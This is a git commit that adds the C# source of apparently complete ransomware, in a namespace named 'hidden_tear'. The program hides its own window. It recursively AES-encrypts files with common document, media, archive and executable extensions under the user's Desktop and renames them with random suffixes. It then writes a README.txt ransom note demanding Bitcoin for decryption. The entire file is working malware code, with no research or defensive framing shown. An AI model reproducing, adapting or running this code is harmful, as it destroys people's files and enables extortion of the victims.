5c878caf3b483ab1d44ab2c796b5d0182db613c7
3yv <i4x@pm.me>
2021-02-08 11:05:48 +0300

    first commit

---
+++ Documents/Form1.cs
@@ -0,0 +1,152 @@
+﻿using System;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
+using System.Security.Cryptography;
+using System.IO;
+
+namespace hidden_tear
+{
+    public partial class Form1 : Form
+    {
+        string userName = Environment.UserName;
+        string computerName = System.Environment.MachineName.ToString();
+        string userDir = "C:\\Users\\";
+
+
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            Opacity = 0;
+            this.ShowInTaskbar = false;
+            startAction();
+
+        }
+
+        private void Form_Shown(object sender, EventArgs e)
+        {
+            Visible = false;
+            Opacity = 100;
+        }
+
+        //AES encryption algorithm
+        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
+        {
+            byte[] encryptedBytes = null;
+            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+            using (MemoryStream ms = new MemoryStream())
+            {
+                using (RijndaelManaged AES = new RijndaelManaged())
+                {
+                    AES.KeySize = 256;
+                    AES.BlockSize = 128;
+
+                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
+                    AES.Key = key.GetBytes(AES.KeySize / 8);
+                    AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+                    AES.Mode = CipherMode.CBC;
+
+                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
+                    {
+                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
+                        cs.Close();
+                    }
+                    encryptedBytes = ms.ToArray();
+                }
+            }
+
+            return encryptedBytes;
+        }
+
+        public string CreatePassword(int length)
+        {
+            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
+            StringBuilder res = new StringBuilder();
+            Random rnd = new Random();
+            while (0 < length--){
+                res.Append(valid[rnd.Next(valid.Length)]);
+            }
+            return res.ToString();
+        }
+        public string filename_random(int length)
+        {
+            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+            StringBuilder res = new StringBuilder();
+            Random rnd = new Random();
+            while (0 < length--)
+            {
+                res.Append(valid[rnd.Next(valid.Length)]);
+            }
+            return res.ToString();
+        }
+
+        public void EncryptFile(string file, string password)
+        {
+
+            string filerandomname = filename_random(6);
+            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
+            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
+
+            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
+
+            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
+
+            File.WriteAllBytes(file, bytesEncrypted);
+            System.IO.File.Move(file, file + "." + filerandomname);
+
+            
+            
+
+        }
+
+        public void encryptDirectory(string location, string password)
+        {
+            
+            var validExtensions = new[]
+            {
+                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".jpg", ".png", ".mp3", ".mp4", ".pdf", ".docx", ".hwp", ".wav", ".zip", ".wav", ".flac", ".html", ".php", ".sln", ".dll", ".sln", ".ink" ,".bat",".jpeg",".7z",".py",".exe",".md",".ink"
+            };
+
+            string[] files = Directory.GetFiles(location);
+            string[] childDirectories = Directory.GetDirectories(location);
+            for (int i = 0; i < files.Length; i++){
+                string extension = Path.GetExtension(files[i]);
+                if (validExtensions.Contains(extension))
+                {
+                    EncryptFile(files[i],password);
+                }
+            }
+            for (int i = 0; i < childDirectories.Length; i++){
+                encryptDirectory(childDirectories[i],password);
+            }
+            
+            
+        }
+
+        public void startAction()
+        {
+            string password = CreatePassword(40);
+            string path = "\\Desktop";
+            string startPath = userDir + userName + path;
+            encryptDirectory(startPath,password);
+            messageCreator();
+            string txtpath = "\\Desktop\\README.txt";
+            string fullpath = userDir + userName + txtpath;
+            string[] lines = {userName + "Hello, \nOops, Your Files Have Been Encrypted.\n======================================================================\n Don’t worry,you can return all your files!.\n\nAll your files have been encrypted due to a security problem with your PC. If you want to restore them, write us to the e-mail:\n\nYou have to pay for decryption in Bitcoins. The price depends on how fast you write to us. After payment we will send you the tool that will decrypt all your files .\n\n======================================================================\n\nEncryption folder PATH: " + startPath + "\n- -This key is used for decryption, and you should never delete README.txt. -\nPassword : " + password};
+            File.WriteAllLines(fullpath, lines);
+            password = null;
+            Application.Exit();
+        }
+
+        public void messageCreator()
+        {
+
+        }
+    }
+}
